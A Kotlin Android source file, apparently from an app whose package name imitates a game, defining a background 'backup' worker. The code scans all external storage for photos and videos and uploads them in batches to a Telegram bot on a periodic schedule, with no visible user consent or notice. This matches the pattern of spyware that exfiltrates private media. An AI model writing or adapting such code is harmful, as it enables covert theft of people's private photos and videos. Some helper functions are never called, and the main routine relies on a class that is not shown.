package com.service.assasinscreed02

import android.content.Context
import androidx.work.Worker
import androidx.work.WorkerParameters
import java.io.File
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody
import android.os.Environment
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import java.util.concurrent.TimeUnit
import android.util.Log
import androidx.work.BackoffPolicy
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.content.SharedPreferences
import java.security.MessageDigest
import kotlinx.coroutines.delay
import com.google.gson.Gson
import com.google.gson.annotations.SerializedName

class BackupWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
    companion object {
        private const val TAG = "BackupWorker"
        private const val PREFS_NAME = "BackupPrefs"
        private const val UPLOADED_FILES_KEY = "uploaded_files"
        private const val BATCH_SIZE_IMAGES = 10
        private const val BATCH_SIZE_VIDEOS = 3
        private const val BATCH_DELAY_MS = 2000L // 2 segundos entre lotes
    }

    data class BackupHistoryEntry(
        val fileName: String,
        val hash: String,
        val timestamp: Long
    )

    override fun doWork(): Result {
        return try {
            // El backup automático solo funciona con WiFi
            val success = BackupUtils.runBackup(applicationContext, forzarConDatos = false)
            if (success) Result.success() else Result.retry()
        } catch (e: Exception) {
            Log.e(TAG, "Error en BackupWorker: ${e.message}", e)
            Result.retry()
        }
    }
    
    private fun isWifiConnected(): Boolean {
        try {
            val connectivityManager = applicationContext.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val network = connectivityManager.activeNetwork ?: return false
            val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
            
            return capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)
        } catch (e: Exception) {
            Log.e(TAG, "Error verificando WiFi: ${e.message}")
            return false
        }
    }
    
    private fun escanearArchivosNuevos(context: Context): List<File> {
        val extensiones = listOf("jpg", "jpeg", "png", "mp4", "mov", "avi")
        val archivos = mutableListOf<File>()
        val archivosSubidos = obtenerArchivosSubidos(context)
        
        try {
            val directorio = Environment.getExternalStorageDirectory()
            if (!directorio.exists() || !directorio.canRead()) {
                Log.w(TAG, "No se puede acceder al directorio de almacenamiento")
                return archivos
            }
            
            directorio.walkTopDown().forEach { file ->
                try {
                    if (file.isFile && extensiones.any { file.extension.equals(it, ignoreCase = true) }) {
                        if (file.canRead() && file.length() > 0) {
                            val hash = calcularHashArchivo(file)
                            if (!archivosSubidos.contains(hash)) {
                                archivos.add(file)
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Error procesando archivo ${file.name}: ${e.message}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error escaneando medios: ${e.message}", e)
        }
        
        return archivos.sortedBy { it.lastModified() }.reversed() // Más recientes primero
    }
    
    private fun calcularHashArchivo(file: File): String {
        return try {
            val md = MessageDigest.getInstance("MD5")
            val bytes = file.readBytes()
            val digest = md.digest(bytes)
            digest.joinToString("") { "%02x".format(it) }
        } catch (e: Exception) {
            Log.e(TAG, "Error calculando hash de ${file.name}: ${e.message}")
            file.absolutePath + "_" + file.lastModified()
        }
    }
    
    private fun obtenerArchivosSubidos(context: Context): Set<String> {
        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        return prefs.getStringSet(UPLOADED_FILES_KEY, emptySet()) ?: emptySet()
    }
    
    private fun serializarHistorial(context: Context): File? {
        return try {
            val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            val archivos = prefs.getStringSet(UPLOADED_FILES_KEY, emptySet()) ?: emptySet()
            val historyList = archivos.mapNotNull { hash ->
                val parts = hash.split("|||")
                if (parts.size == 3) BackupHistoryEntry(parts[0], parts[1], parts[2].toLongOrNull() ?: 0L) else null
            }
            val json = Gson().toJson(historyList)
            val file = File(context.cacheDir, "historial_backup.json")
            file.writeText(json)
            file
        } catch (e: Exception) {
            Log.e(TAG, "Error serializando historial: ${e.message}")
            null
        }
    }

    private fun guardarArchivoSubido(context: Context, file: File, hash: String) {
        try {
            val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            val archivosSubidos = prefs.getStringSet(UPLOADED_FILES_KEY, emptySet())?.toMutableSet() ?: mutableSetOf()
            val entry = "${file.name}|||$hash|||${file.lastModified()}"
            archivosSubidos.add(entry)
            prefs.edit().putStringSet(UPLOADED_FILES_KEY, archivosSubidos).apply()
        } catch (e: Exception) {
            Log.e(TAG, "Error guardando archivo subido: ${e.message}")
        }
    }
    
    private fun isImage(file: File): Boolean {
        val extension = file.extension.lowercase()
        return extension in listOf("jpg", "jpeg", "png")
    }
    
    private fun isVideo(file: File): Boolean {
        val extension = file.extension.lowercase()
        return extension in listOf("mp4", "mov", "avi")
    }
    
    private fun enviarPorLotes(token: String, chatId: String, archivos: List<File>, batchSize: Int, tipo: String) {
        if (archivos.isEmpty()) return
        
        val lotes = archivos.chunked(batchSize)
        Log.d(TAG, "Enviando ${archivos.size} $tipo en ${lotes.size} lotes")
        
        lotes.forEachIndexed { index, lote ->
            try {
                Log.d(TAG, "Enviando lote ${index + 1}/${lotes.size} de $tipo")
                
                var archivosEnviados = 0
                lote.forEach { archivo ->
                    try {
                        if (enviarArchivoATelegram(token, chatId, archivo)) {
                            archivosEnviados++
                            val hash = calcularHashArchivo(archivo)
                            guardarArchivoSubido(applicationContext, archivo, hash)
                            Log.d(TAG, "Archivo enviado: ${archivo.name}")
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error enviando archivo ${archivo.name}: ${e.message}")
                    }
                }
                
                Log.d(TAG, "Lote ${index + 1} completado: $archivosEnviados/$tipo enviados")
                
                // Delay entre lotes (excepto el último)
                if (index < lotes.size - 1) {
                    Thread.sleep(BATCH_DELAY_MS)
                }
                
            } catch (e: Exception) {
                Log.e(TAG, "Error enviando lote ${index + 1}: ${e.message}")
            }
        }
    }
}

fun enviarArchivoATelegram(token: String, chatId: String, archivo: File): Boolean {
    if (!archivo.exists() || !archivo.canRead()) {
        Log.w("BackupWorker", "Archivo no accesible: ${archivo.name}")
        return false
    }
    
    val url = "https://api.telegram.org/bot$token/sendDocument"
    
    try {
        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", chatId)
            .addFormDataPart("document", archivo.name, archivo.asRequestBody("application/octet-stream".toMediaTypeOrNull()))
            .build()

        val request = Request.Builder()
            .url(url)
            .post(requestBody)
            .build()

        val client = OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .readTimeout(60, TimeUnit.SECONDS)
            .writeTimeout(60, TimeUnit.SECONDS)
            .build()

        val response = client.newCall(request).execute()
        val success = response.isSuccessful
        response.close()
        
        return success
    } catch (e: Exception) {
        Log.e("BackupWorker", "Error enviando archivo ${archivo.name}: ${e.message}", e)
        return false
    }
}

fun programarBackup(context: Context, intervaloHoras: Long) {
    try {
        val workRequest = PeriodicWorkRequestBuilder<BackupWorker>(intervaloHoras, TimeUnit.HOURS)
            .setBackoffCriteria(BackoffPolicy.LINEAR, 1, TimeUnit.HOURS)
            .build()
            
        WorkManager.getInstance(context).enqueueUniquePeriodicWork(
            "backup_trabajo",
            ExistingPeriodicWorkPolicy.REPLACE,
            workRequest
        )
        Log.d("BackupWorker", "Backup programado para cada $intervaloHoras horas")
    } catch (e: Exception) {
        Log.e("BackupWorker", "Error programando backup: ${e.message}", e)
    }
} 